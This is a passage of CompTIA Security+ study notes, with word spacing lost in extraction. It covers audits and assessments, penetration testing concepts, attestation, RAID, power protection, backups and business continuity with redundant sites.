+needed■ Ensureschangesdonotcreatechaosandhelpstrackprojectevolution■ Preservespastiterationsandensurescontinuityandstability○ ProperDocumentation■ Allaccompanyingdocumentationshouldbeupdatedwhenimplementinga
+
+change
+
+150https://www.DionTraining.com
+
+## Page 151
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Updatesshouldreflecttheimplementationofthechange,fromminor
+
+configurationstomajornetworkoverhauls■ Keyelementsofproperdocumentation● Updatingdiagramstoprovideavisualrepresentationofsystem
+
+architecture● Revisingpoliciesandprocedurestoaddressissuesorimprovements● Updatingchangerequestsandtroubleticketstoreflectsuccessful
+
+completion■ Properdocumentationiscriticalforclarityandaccountability○ ContinuousImprovement■ Afterimplementingachange,evaluatetheprocessanditssuccess■ Identifyissuesandrevisepoliciesandprocedurestopreventrecurrence■ Emphasizesiterativeprocessimprovementtoensuresmootherfuturechanges■ Learnfrompastmistakesforbetterchangemanagementpractices○ ImportanceofRecords■ Changerequestsandtroubleticketshelpcreateacleartimelineofchange
+
+actions■ Informstakeholdersandprovidearecordofchangehistoryforfuturereference■ Recordsareessentialforcommunicationandaccountabilityinchange
+
+management
+
+151https://www.DionTraining.com
+
+## Page 152
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+AuditsandAssessments
+
+Objective5.5:Explaintypesandpurposesofauditsandassessments
+
+● AuditsandAssessments○ Audits■ Systematicevaluationsofanorganization'sinformationsystems,applications,
+
+andsecuritycontrols■ Types● InternalAudits○ Conductedbytheorganization'sownteam● ExternalAudits○ Performedbythird-partyentities■ Purpose● Validatesecuritymeasures● Identifyvulnerabilities● Maintaincompliancewithregulatorystandards■ Examples● InternalAuditExample○ Reviewofdataprotectionpolicies○ Checkpolicyrelevanceandcompliance● ExternalAuditExample○ Evaluationofe-commercePCIDSScompliance○ Assessnetworksecurity,dataencryption,andaccesscontrols
+
+152https://www.DionTraining.com
+
+## Page 153
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● SignificanceofAudits○ IdentifyingGaps■ Securitypolicies,procedures,andcontrols○ EnsuringCompliance■ GDPR,HIPAA,PCIDSS○ Assessments■ Detailedanalysistoidentifyvulnerabilitiesandrisks■ Performedbeforeimplementingnewsystemsorsignificantchanges■ Categories● RiskAssessments● VulnerabilityAssessments● ThreatAssessments○ InternalAuditsandAssessments■ Reviewprocesses,controls,andcompliance■ Importance● Ensureoperationaleffectivenessandadherencetointernalpolicies○ ExternalAuditsandAssessments■ Independentevaluationsbyexternalparties■ VerificationAreas● Financialstatements● Compliance● Operationalpractices○ PenetrationTesting■ Simulatedcyberattackstoidentifyvulnerabilities■ Objective● Findvulnerabilitiesexploitedbyattackers
+
+153https://www.DionTraining.com
+
+## Page 154
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Alsoknownas“PenTesting”or“EthicalHacking”○ ReconnaissanceinPentesting■ Gatheringinformationbeforeapentest■ Types● Passive● Active■ EnvironmentConsideration● Known● PartiallyKnown● Unknown○ AttestationofFindings■ Formal,writtendeclarationofauditorassessmentresults■ Purpose● Confirmationanddocumentationofoutcomes
+
+● InternalAuditsandAssessments○ InternalAudits■ Systematicevaluationsconductedbyanorganization'sownauditteam■ Assesstheeffectivenessofinternalcontrols,compliancewithregulations,and
+
+theintegrityofinformationsystemsandprocesses■ Focusareasmayinclude● Dataprotection● Networksecurity● Accesscontrols● Incidentresponseprocedures
+
+154https://www.DionTraining.com
+
+## Page 155
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Examplesofinternalauditfocusareas● Passwordpolicies● Useraccesscontrols■ Process● Reviewingpoliciesandprocedures● Examiningaccessrights● Testingeffectivenessofcontrols● Findingsdocumentedforrecommendationsandimprovements■ ConceptsinInternalAudits● ComplianceRequirements○ Ensuringadherencetoestablishedstandards,regulations,and
+
+laws○ Complianceisessentialforprotectingsensitivedataandavoiding
+
+legalpenalties○ Internalauditsmayberequiredforcompliancewithspecificlaws
+
+- rregulations● AuditCommittee○ Agroup,oftencomprisingmembersofacompany'sboardof
+directors,overseeingauditandcomplianceactivities○ Responsibilities■ Reviewingfinancialreporting■ Internalcontrols■ Internalandexternalaudits■ Legalandregulatorycompliance○ Addressesissuesraisedbyauditors
+
+155https://www.DionTraining.com
+
+## Page 156
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ InternalAssessments■ Conductedtoidentifyandevaluatepotentialrisksandvulnerabilitiesinan
+
+- rganization'sinformationsystems■ Commonlyperformedbeforeimplementingnewsystemsormakingsignificant
+changestoexistingones■ Self-assessments● Internalevaluationsassessingcompliancewithspecificstandardsor
+
+regulations■ Vulnerabilityassessments,threatmodelingexercises,andriskassessmentsare
+
+partofinternalassessments■ Assistedinternalassessmentsmayinvolvededicatedassessmentgroups■ InternalAssessmentProcess● ThreatModelingExercise○ Identifiespotentialthreatstoapplications(e.g.,SQLinjection,XSS,
+
+DoSattacks)● VulnerabilityAssessment○ Usesautomatedscanningtoolsandmanualtestingtechniquesto
+
+identifyknownvulnerabilitiesandcodeweaknesses● RiskAssessment○ Evaluatesthepotentialimpactofthefollowing■ Identifiedthreatsandvulnerabilities■ Consideringlikelihood■ Potentialdamage■ Costofsecuritymeasures■ MitigationStrategies● Recommendationstoaddressrisksandvulnerabilities
+
+156https://www.DionTraining.com
+
+## Page 157
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ Codefixes○ Additionalsecuritycontrols○ Architecturalchanges
+
+● PerforminganInternalAssessment○ InternalAssessment■ Proactiveevaluationofanorganization'ssecurityposture■ Helpstoidentifyandaddresspotentialrisksandvulnerabilitiesininformation
+
+systems○ UsingaSampleChecklist■ Thespecificchecklistsandproceduresforaninternalassessmentmayvarybased
+
+- nthefollowing● Organization'sgovernance● Risk● Compliancepractices■ AsamplechecklistfromtheMinnesotaCountiesIntergovernmentalTrust(MCIT)
+isused■ MCITCybersecuritySelf-Assessment● MCIT'sCybersecuritySelf-Assessmentchecklistisdesignedtohelp
+
+- rganizationsminimizedataandcybersecurity-relatedexposures● Itassistsinidentifyingareaswheredatasecuritymayneedstrengthening● Thechecklistcomprisesyes-or-noquestionswithsectionsforcomments
+andactionitems● Actionitemsareassignedtospecificindividualsorgroupsresponsiblefor
+
+implementingcorrectiveactions
+
+157https://www.DionTraining.com
+
+## Page 158
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ CollaborativeApproach■ Tomaximizethechecklist'seffectiveness,involveadiversegroupofparticipants
+
+fromacrosstheorganization● Administrationteam● Informationtechnologystaff● Cybersecurityprofessionals○ OverviewoftheChecklist■ Thechecklistisbroadandaimstoprovideaquickoverviewoftheorganization's
+
+currentriskposture■ Organizationsmayusedifferentchecklistsorvariationswithdistinctquestions■ Thegeneralformatandpurposeofself-assessmentsareconsistentacrossmost
+
+- rganizations
+● ExternalAuditsandAssessments○ ExternalAuditsandAssessments■ Essentialtoolsformaintainingarobustsecuritypostureandensuringregulatory
+
+compliance■ Conductedbyindependentthirdpartiestoprovideanunbiasedperspectiveon
+
+anorganization'ssecurity○ ExternalAudits■ Systematicevaluationsconductedbyindependententities■ Assessinformationsystems,applications,andsecuritycontrols■ Focusesonvariousareas● Dataprotection● Networksecurity● Accesscontrols
+
+158https://www.DionTraining.com
+
+## Page 159
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Incidentresponseprocedures■ Objectiveistoidentifygapsinsecuritypoliciesandcontrolsforcompliancewith
+
+regulatorystandardssuchas● GDPR● HIPAA● PCIDSS○ ExternalAssessments■ Detailedanalysisbyindependententitiestoidentifyvulnerabilitiesandrisksinan
+
+- rganization'ssecuritysystems■ Utilizeautomatedscanningtoolsandmanualtestingtechniques■ Externalassessmentscantakevariousforms● Riskassessments● Vulnerabilityassessments● Threatassessments○ RegulatoryCompliance■ Thegoalistoensureorganizationscomplywithrelevantlaws,policies,and
+regulations■ Organizationsadoptconsolidatedandharmonizedsetsofcompliancecontrolsto
+
+achieveregulatorycompliance,e.g.,NISTCybersecurityFramework■ Complianceincludesadherencetoindustry-specificrules(e.g.,HIPAA,PCIDSS)
+
+andmoregeneralizedregulationslikeGDPR○ Examinations■ Detailedinspectionsofanorganization'ssecurityinfrastructureconducted
+
+externally■ Covervariousareas● Networksecurity
+
+159https://www.DionTraining.com
+
+## Page 160
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Dataprotection● Accesscontrols■ Mayincludetestingofthefollowing● Keypersonnel● Certifications● Standardizedassessments■ Crucialformaintainingastrongsecuritypostureandregulatorycompliance.○ IndependentThird-PartyAudits■ Provideanunbiasedperspectiveonanorganization'ssecurityposture■ Validatesecuritymeasuresandbuildtrustwith● Customers● Stakeholder● Regulatorybodies■ RequiredbyregulationslikeGDPRandPCIDSSfororganizationstoundergo
+
+regularindependentthird-partyaudits
+
+● PerforminganExternalAssessment○ ExternalAssessment■ Partofmaintainingarobustsecuritypostureandensuringcompliance■ Mayvarybasedonthefollowing● Organization'sgovernance● Risk● Compliancepractices■ SamplechecklistusedforaHIPAAexternalassessmentfromthegovernmentof
+
+SanBernardinoCounty,Californiaasademonstration■ Purposeistovalidatecompliancewithspecificregulationsandminimize
+
+160https://www.DionTraining.com
+
+## Page 161
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+cybersecurityrisks○ PreparingforaHIPAAExternalAssessment■ Examinersprovideachecklistofquestionsthatorganizationsmustanswer■ Questionsareansweredaseither"yes"or"no"■ Evidencefiles,suchasdocumentsorlinks,mustbeprovidedtodemonstrate
+
+compliance○ SampleChecklist■ Questionscovervariousaspectslikegeneralinformation,policies,procedures,
+
+andemployeetraining■ Organizationsmustprovideevidencefilesasproofofcompliance■ Externalassessmentsaimtoprovideaquickoverviewoftheorganization's
+
+currentriskposture
+
+● PenetrationTesting○ PenetrationTesting(Pentesting)■ Simulatedcyberattacktoidentifyexploitablevulnerabilitiesinacomputer
+
+system■ Assessessystemsforpotentialweaknessesthatattackerscouldexploit■ Varioustypesinclude● Physical● Offensive● Defensive● Integrated
+
+161https://www.DionTraining.com
+
+## Page 162
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ PhysicalPenetrationTesting■ Evaluatesanorganization'sphysicalsecuritymeasures■ Examples● Testinglocks● Accesscard● Securitycameras■ Identifiesvulnerabilitiesandrecommendsimprovementsforenhancedphysical
+
+security■ Benefits● Improvedsecurityawareness● Preventingunauthorizedaccess○ OffensivePenetrationTesting■ Knownas“redteaming”■ Activelyseeksvulnerabilitiesandattemptstoexploitthem,likearealcyber
+
+attack■ Helpsuncoverandreportvulnerabilitiestoimprovesecurity■ Cansimulatereal-worldattacksandgainsupportforcybersecurityinvestments○ DefensivePenetrationTesting■ Knownas“blueteaming”■ Areactiveapproachfocusedonstrengtheningsystems,detectingandresponding
+
+toattacks■ Monitorsforunusualactivityandimprovesincidentresponsetimes■ Enhancesdetectioncapabilitiesandhelpsimproveincidentresponse○ IntegratedPenetrationTesting■ Knownas“purpleteaming”■ Combineselementsofoffensiveanddefensivetesting
+
+162https://www.DionTraining.com
+
+## Page 163
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Redteamconductsoffensiveattacks,whiletheblueteamdetectsandresponds■ Encouragescollaborationandlearningbetweentheredandblueteams■ Benefits● Comprehensivesecurityassessment● Promotescollaborationwithincybersecurityteams● Conductssimulatedattacksandresponsestoimproveskills
+
+● ReconnaissanceinPentesting○ Reconnaissance■ Initialphasewhereanattackergathersinformationaboutthetargetsystem■ Informationhelpsplantheattackandincreaseitssuccessrate○ ImportanceofReconnaissance■ Crucialstepinpenetrationtesting■ Identifiespotentialvulnerabilitiesinthetargetsystem■ Helpsplantheattacktoreducetheriskofdetectionandfailure
+
+○ TypesofReconnaissance■ ActiveReconnaissance● Engagingwiththetargetsystemdirectly,suchasscanningforopenports
+
+usingtoolslikeNmap■ PassiveReconnaissance● Gatheringinformationwithoutdirectengagement,likeusingopen-source
+
+intelligenceorWHOIStocollectdata○ ReconnaissanceandEnvironmentTypes■ KnownEnvironment● Penetrationtestershavedetailedinformationaboutthetarget
+
+163https://www.DionTraining.com
+
+## Page 164
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+infrastructure● Focusesonknownassets● Evaluatesvulnerabilitiesandweaknesses● Aimstounderstandexploitabilityandpotentialdamages● Resemblesaninsiderthreatscenario■ PartiallyKnownEnvironment● Testershavelimitedinformation,simulatingascenariowhereanattacker
+
+haspartialinsideknowledge● Focusondiscoveringandnavigatingthebroaderenvironment■ UnknownEnvironment● Minimaltonoinformationaboutthetargetsystem● Simulatesareal-worldexternalattackeraimingtofindentrypointsand
+
+vulnerabilities● Extensivereconnaissanceisessential
+
+● PerformingaBasicPenTest○ Metasploit■ Multipurposecomputersecurityandpenetrationtestingframework■ Hasawidearrayofpowerfultoolsforconductingpenetrationtests
+
+● AttestationofFindings○ Attestation■ Involvesformalvalidationorconfirmationprovidedbyanentitytoassertthe
+
+accuracyandauthenticityofspecificinformation■ Crucialininternalandexternalauditstoensurethereliabilityandintegrityofthe
+
+following
+
+164https://www.DionTraining.com
+
+## Page 165
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Data● Systems● Processes○ AttestationofFindingsinPenetrationTesting■ Usedtoprovethatapenetrationtestoccurredandvalidatethefindings■ Mayberequiredforcomplianceorregulatorypurposes(e.g.,GLBA,HIPAA,
+
+Sarbanes-Oxley,PCIDSS)■ Includesasummaryoffindingsandevidenceofthesecurityassessment■ Evidencehelpstoprovethatidentifiedvulnerabilitiesandexploitsarevalid■ Thedifferencebetweenattestationandthereport● Attestationincludesevidence● Reportfocusesonfindingsandrecommendedremediation■ Aletterofattestationmaybeprovidedtoprovetheoccurrenceofthe
+
+penetrationtesting,especiallywhenrequiredbythirdpartiesinterestedin
+
+networksecurity○ TypesofAttestation■ SoftwareAttestation● Involvesvalidatingtheintegrityofsoftwaretoensureithasn'tbeen
+
+tamperedwith■ HardwareAttestation● Validatestheintegrityofhardwarecomponentstoconfirmtheyhaven't
+
+beentamperedwith■ SystemAttestation● Validatesthesecuritypostureofasystem,oftenrelatedtocompliance
+
+withsecuritystandards
+
+165https://www.DionTraining.com
+
+## Page 166
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ AttestationinAudits■ Ininternalaudits,attestationevaluatesorganizationalcompliance,effectiveness
+
+- finternalcontrols,andadherencetopoliciesandprocedures■ Inexternalaudits,third-partyentitiesprovideattestationonfinancial
+statements,regulatorycompliance,andoperationalefficiency■ Attestationbuildstrust,enhancestransparency,ensuresaccountability,andis
+
+essentialforstakeholdersinmakinginformeddecisions
+
+166https://www.DionTraining.com
+
+## Page 167
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+CyberResilienceandRedundancy
+
+Objective3.4:Explaintheimportanceofresilienceandrecoveryinsecurityarchitecture
+
+● CyberResilienceandRedundancy○ CyberResilience■ Abilitytodeliveroutcomesdespiteadversecyberevents○ Redundancy■ Havingadditionalsystemsorprocessesforcontinuedfunctionality○ SignificanceofCyberResilience■ SwiftRecovery● Enablesorganizationstorecoverswiftlyaftercyberevents■ ContinuousOperations● Ensurescontinuousoperationsdespiteattacksortechnicalfailures○ HighAvailability■ Importance● Criticalforcontinuousoperations■ Elements● Loadbalancing● Clustering● Redundancyinpower● Connections● Servers● Services● Multi-cloudsystems
+
+167https://www.DionTraining.com
+
+## Page 168
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ DataRedundancy■ Achievedby● Redundantstoragedevices■ Types● RAIDconfigurations○ CapacityPlanning■ Importance● Efficientscalingduringpeakdemand■ Considerations● People● Technology● Infrastructure○ PowerComponents■ Generators,UPS,lineconditioners,powerdistributioncenters(PDCs)■ Ensuresconstantpowersupplytodatacenters○ DataBackups■ Types● Onsite● Offsite■ Methods● Encryption● Snapshots● Recovery● Replication● Journaling
+
+168https://www.DionTraining.com
+
+## Page 169
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ BusinessContinuityandDisasterRecovery(BC/DR)Plan■ Importance● Ensuressmoothbusinessoperationsduringunforeseenevents○ BackupSiteOptions■ Hot■ Cold■ WarmSites■ GeographicDispersion■ VirtualSites■ PlatformDiversity○ TestingMethods■ TabletopExercises■ FailoverTechniques■ Simulation■ ParallelProcessing■ UseCases● Supportdifferentscenarioswithinorganizations
+
+● HighAvailability○ HighAvailabilityBasics■ HighAvailability● Aimstokeepservicescontinuouslyavailablebyminimizingdowntime● Achievedthroughloadbalancing,clustering,redundancy,andmulti-cloud
+
+strategies
+
+169https://www.DionTraining.com
+
+## Page 170
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ UptimeandAvailabilityStandards■ Uptime● Thetimeasystemremainsonline,typicallyexpressedasapercentage■ Fivenines● Refersto99.999%uptime,allowingonlyabout5minutesofdowntime
+
+peryear■ Sixnines● Refersto99.9999%uptime,allowsjust31secondsofdowntimeperyear○ LoadBalancing■ Distributesworkloadsacrossmultipleresources■ Optimizesresourceuse,throughput,andresponsetime■ Preventsoverloadingofanysingleresource■ Incomingrequestsaredirectedtocapableservers○ Clustering■ Usesmultiplecomputers,storagedevices,andnetworkconnectionsasasingle
+
+system■ Provideshighavailability,reliability,andscalability■ Ensurescontinuityofserviceevenincaseofhardwarefailure■ Canbecombinedwithloadbalancingforrobustsolutions○ Redundancy■ Involvesduplicatingcriticalcomponentstoincreasesystemreliability■ Redundancycanbeimplementedbyaddingmultiple● Powersupplies● Networkconnections● Servers● Softwareservices
+
+170https://www.DionTraining.com
+
+## Page 171
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Serviceproviders■ Preventssinglepointsoffailureinsystems■ Examples● Redundantpowersupplies● Networkconnections● Backupservers○ Multi-CloudApproach■ Distributesdata,applications,andservicesacrossmultiplecloudproviders■ Mitigatestheriskofasinglepointoffailure■ Offersflexibilityforcostoptimization■ Aidsinavoidingvendorlock-in■ Requiresproperdatamanagement,unifiedthreatmanagement,andconsistent
+
+policyenforcementforsecurityandcompliance○ StrategicPlanning■ Designarobustsystemarchitecturetoachievehighavailability■ Utilizeloadbalancing,clustering,redundancy,andmulti-cloudapproaches■ Proactivemeasuresreducetheriskofservicedisruptionsanddowntimecosts■ Safeguardorganizationalcontinuityandreliabilityinacompetitiveenvironment
+
+● DataRedundancy○ RAIDOverview■ RAID(RedundantArrayofIndependentDisks)● Combinesmultiplephysicalstoragedevicesintoasinglelogicalstorage
+
+devicerecognizedbytheoperatingsystem○ RAID0■ Providesdatastripingacrossmultipledisks
+
+171https://www.DionTraining.com
+
+## Page 172
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Usedforimprovedperformancebutoffersnodataredundancy■ Multipledrivesincreasereadandwritespeeds■ Suitableforscenarioswhereperformanceisessential,anddataredundancyis
+
+notaconcern○ RAID1■ Providesredundancybymirroringdataidenticallyontwostoragedevices■ Ensuresdataintegrityandavailability■ Suitableforcriticalapplicationsandmaintainsacompletecopyofdataonboth
+
+devices■ Onlyonestoragedevicecanfailwithoutdatalossordowntime○ RAID5■ Utilizesstripingwithparityacrossatleastthreestoragedevices■ Offersfaulttolerancebydistributingdataandparity■ Cancontinueoperationsifonestoragedevicefails■ Datareconstructionispossiblebutresultsinsloweraccessspeeds○ RAID6■ SimilartoRAID5butincludesdoubleparitydata■ Requiresatleastfourstoragedevices■ Canwithstandthefailureoftwostoragedeviceswithoutdataloss○ RAID10■ CombinesRAID1(mirroring)andRAID0(striping)■ Offershighperformance,faulttolerance,anddataredundancy■ Requiresanevennumberofstoragedevices,withaminimumoffour○ RAIDResilienceCategories■ Failure-resistant● Resistshardwaremalfunctionsthroughredundancy(e.g.,RAID1)
+
+172https://www.DionTraining.com
+
+## Page 173
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Fault-tolerant● Allowscontinuedoperationandquickdatarebuildincaseoffailure(e.g.,
+
+RAID1,RAID5,RAID6,RAID10)■ Disaster-tolerant● Safeguardsagainstcatastrophiceventsbymaintainingdatain
+
+independentzones(e.g.,RAID1,RAID10)○ RAIDsareessentialforensuringdataredundancy,availability,andperformancein
+
+enterprisenetworks○ ThechoiceofRAIDtypedependsonspecificrequirementsforperformanceandfault
+
+tolerance
+
+● CapacityPlanning○ CapacityPlanning■ Criticalstrategicplanningeffortfororganizations■ Ensuresanorganizationispreparedtomeetfuturedemandsinacost-effective
+
+manner○ FourMainAspectsofCapacityPlanning■ People● Analyzecurrentpersonnelskillsandcapacity● Forecastfuturepersonnelneedsforhiring,training,ordownsizing● Ensuretherightnumberofpeoplewiththerightskillsforstrategic
+
+- bjectives● Example○ Hiringseasonalemployeesforholidayretaildemand■ Technology● Assesscurrenttechnologyresourcesandtheirusage
+173https://www.DionTraining.com
+
+## Page 174
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Predictfuturetechnologydemands● Considerscalabilityandpotentialinvestmentsinnewtechnology● Example○ Ensuringane-commerceplatformcanhandletrafficspikes■ Infrastructure● Planforphysicalspacesandutilitiestosupportoperations● Includesofficespaces,datacenters,andmore● Optimizespaceandpowerconsumption● Example○ Datacentercapacityplanningforserverinstallations
+
+■ Processes● Optimizebusinessprocessesforvaryingdemandlevels● Streamlineworkflows,improveefficiency,andconsideroutsourcing● Example○ Automatingemployeeonboardingtohandlehighdemand
+
+● PoweringDataCenters○ KeyTerms■ Surges● Sudden,smallincreasesinvoltagebeyondthestandardlevel(e.g.,120V
+
+intheUS)■ Spikes● Short-livedvoltageincreases,oftencausedbyshortcircuits,tripped
+
+breakers,orlightning
+
+174https://www.DionTraining.com
+
+## Page 175
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Sags● Briefdecreasesinvoltage,usuallynotsevereenoughtocausesystem
+
+shutdown■ UndervoltageEvents(Brownouts)● Prolongedreductioninvoltage,leadingtosystemshutdown■ PowerLossEvents(Blackouts)● Completelossofpowerforaperiod,potentiallycausingdatalossand
+
+damage○ PowerProtectionComponents■ LineConditioners● Stabilizevoltagesupplyandfilteroutfluctuations● Mitigatesurges,sags,andundervoltageevents● Preventunexpectedsystembehaviorandhardwaredegradation● Unsuitableforsignificantundervoltageeventsorcompletepowerfailures■ UninterruptiblePowerSupplies(UPS)● Provideemergencypowerduringpowersourcefailures● Offerlineconditioningfunctions● Includebatterybackuptomaintainpowerduringshort-durationfailures● Typicallysupply15to60minutesofpowerduringacompletepower
+
+failure■ Generators● Convertmechanicalenergyintoelectricalenergyforuseinanexternal
+
+circuitthroughtheprocessofelectromagneticinduction● Backupgeneratorssupplypowerduringpowergridoutages● Smallergeneratorsforlimitedapplications(e.g.,emergencylighting)● DifferentTypesofGenerators
+
+175https://www.DionTraining.com
+
+## Page 176
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ Portablegas-enginegenerators○ Permanentlyinstalledgenerators○ Battery-invertergenerators■ PowerDistributionCenters(PDC)● Centralhubforpowerreceptionanddistribution● Includescircuitprotection,monitoring,andloadbalancing● IntegrateswithUPSandbackupgeneratorsforseamlesstransitions
+
+duringpowerevents○ ConsiderationsforDataCenters■ Largedatacentersuserack-mountedUPSforserverprotection■ UPSprovideslineconditioningandbatterybackupfor10-15minutes■ Powerdistributionunitsmanageloadbalancingandlineconditioning■ Backupgeneratorsarecrucialforextendedpoweroutagesbutrequirestartup
+
+time■ Buildingdatacenterswithredundancyandprotectionstailoredtousecasesand
+
+budgets
+
+● DataBackups○ DataBackup■ Creatingduplicatecopiesofdigitalinformationtoprotectagainstdataloss,
+
+corruption,orunavailability■ Safeguardsdatafromaccidentaldeletionorsystemfailures○ OnsiteandOffsiteBackups■ OnsiteBackup● Storingdatacopiesinthesamelocationastheoriginaldata
+
+176https://www.DionTraining.com
+
+## Page 177
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ OffsiteBackup● Storingdatacopiesinageographicallyseparatelocation■ Importance● Onsitebackupsareconvenientbutvulnerabletodisasters● Offsitebackupsprotectagainstphysicaldisasters○ BackupFrequency■ Determiningfactorofbackupfrequencyistheorganization’sRPO● RecoveryPointObjective(RPO)○ Ensuresthatthebackupplanwillmaintaintheamountofdata
+
+requiredtokeepanydatalossundertheorganization’sRPO
+
+threshold■ Considerations● Datachangerate● Resourceallocation● Organizationalneeds○ Encryption■ Fundamentalsafeguardthatprotectsthebackupdatafromunauthorizedaccess
+
+andpotentialbreaches● Data-at-restEncryption○ Encryptingdataasitiswrittentostorage● Data-in-transitEncryption○ Protectingdataduringtransmission● Importance○ Safeguardingbackupdatafromunauthorizedaccessandbreaches○ Snapshots■ Point-in-timecopiescapturingaconsistentstate
+
+177https://www.DionTraining.com
+
+## Page 178
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Recordsonlychangessincetheprevioussnapshot,reducingstorage
+
+requirements■ Usecases● Valuableforsystemswheredataconsistencyiscritical,likedatabasesand
+
+fileservers○ DataRecovery■ Severalkeystepsinthedatarecoveryprocess● Selectionoftherightbackup● Initiatingtherecoveryprocess● Datavalidation● Testingandvalidation● Documentationandreporting● Notification■ Importance● Regainingaccesstodataincaseoflossorsystemfailure;awell-defined
+
+andtestedrecoveryplanisessential○ Replication■ Real-timeornear-real-timedatacopyingtomaintaindatacontinuity■ Benefits● Ensuresseamlessdatacontinuity● Suitableforhigh-availabilityenvironments○ Journaling■ Maintainingadetailedrecordofdatachangesovertime■ Benefits● Enablesgranulardatarecovery● Maintainsanaudittrail
+
+178https://www.DionTraining.com
+
+## Page 179
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Ensuresdataintegrityandcompliance■ Considerations● Datatrackinggranularity,size,retentionpolicies,andsecurity
+
+● ContinuityofOperationsPlan○ ContinuityofOperationsPlan(COOP)■ Ensuresanorganization'sabilitytorecoverfromdisruptiveeventsordisasters■ Requiresdetailedplanningandforethought○ KeyTerms■ BusinessContinuityPlanning(BCPlan)● Plansandprocessesforrespondingtodisruptiveevents● Addressesawiderangeofthreatsanddisruptiveincidents● Involvespreventativeactionsandrecoverysteps● Cancoverbothtechnicalandnon-technicaldisruptions■ DisasterRecoveryPlan(DRP)● Focusesonplansandprocessesfordisasterresponse● SubsetoftheBCPlan● Focusesonfasterrecoveryafterdisasters● Addressesspecificeventslikehurricanes,fires,orfloods○ StrategiesforBusinessContinuity■ Consideralternativelocationsforcriticalinfrastructure■ Distributestaffacrossmultiplegeographicregions■ Usecloudservicestomaintainoperationsduringdisasters○ TheRoleofSeniorManagement■ SeniormanagersareresponsiblefordevelopingtheBCPlan■ GoalsforBCandDReffortsshouldbesetbyseniormanagement
+
+179https://www.DionTraining.com
+
+## Page 180
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ AppointaBusinessContinuityCoordinatortoleadtheBusinessContinuity
+
+Committee○ BusinessContinuityCommittee■ Comprisesrepresentativesfromvariousdepartments(IT,Legal,Security,
+
+Communications,etc.)■ Determinesrecoveryprioritiesfordifferentevents■ Identifiesandprioritizessystemscriticalforbusinesscontinuity○ DefiningScope■ Seniormanagementdecidestheplan'sscopebasedonriskappetiteand
+
+tolerance■ Canbebrokendownbybusinessfunctionorgeographicalarea■ Allcomponentsmustbecoherentandcompatibleforcrisissituations
+
+● RedundantSiteConsiderations○ RedundantSite■ Backuplocationorfacilitythatcantakeoveressentialfunctionsandoperations
+
+incasetheprimarysiteexperiencesafailureordisruption○ TypesofContinuityLocations■ HotSites● Upandrunningcontinuously,enablingaquickswitchover● Requiresduplicatingallinfrastructureanddata● Expensive,butprovidesinstantavailability■ WarmSites● Notfullyequipped,butfundamentalsinplace● Canbeupandrunningwithinafewdays● Cheaperthanhotsitesbutwithaslightdelay
+
+180https://www.DionTraining.com
+
+## Page 181
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ ColdSites● Fewerfacilitiesthanwarmsites● Maybejustanemptybuilding,readyin1-2months● Cost-effectivebutaddsmorerecoverytime■ MobileSites● Canbehot,warm,orcold● Utilizesportableunitsliketrailersortents● Offersflexibilityandquickdeployment(e.g.,militaryDJC2)○ PlatformDiversity■ Criticalforeffectivevirtualredundantsites■ Diversifyoperatingsystems,networkequipment,andcloudplatforms■ Reducestheriskofasinglepointoffailure■ Ensuresresilienceandadaptabilityincaseofdisruptions○ VirtualSites■ Leveragingcloud-basedenvironmentsforredundancy■ VirtualHotSite● Fullyreplicatedandinstantlyaccessibleinthecloud■ VirtualWarmSite● Involvesscalingupresourceswhenneeded■ VirtualColdSite● Minimizesongoingcostsbyactivatingresourcesonlyduringdisasters■ Offersscalability,cost-effectiveness,andeasymaintenance○ GeographicDispersion■ Spreadingresourcesacrossdifferentlocationsforhigherredundancy■ Mitigatestheriskoflocalizedoutages■ Enhancesdisasterrecoverycapabilities
+
+181https://www.DionTraining.com
+
+## Page 182
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ ConsiderationsforRedundantSiteSelection■ Thinkabouttechnologystack,people'sworkspace,andlong-termsupport■ Determinewhichtypeofredundantsitesuitsyourorganization'sneeds■ Ensurecontinuityofessentialfunctionsandservicesintheeventofdisruptions
+
+● ResilienceandRecoveryTesting○ ResilienceTesting■ Assesssystem'sabilitytowithstandandadapttodisruptiveevents■ Ensuresthesystemcanrecoverfromunforeseenincidents■ Conductedthroughtabletopexercises,failovertests,simulations,andparallel
+
+processing■ Helpsprepareforeventslikepowerloss,naturaldisasters,ransomwareattacks,
+
+anddatabreaches○ RecoveryTesting■ Evaluatesthesystem'scapacitytorestorenormaloperationafteradisruptive
+
+event■ Involvesexecutingplannedrecoveryactions■ Performedthroughfailovertests,simulations,andparallelprocessing■ Ensuresthatplannedrecoveryproceduresworkeffectivelyinareal-world
+
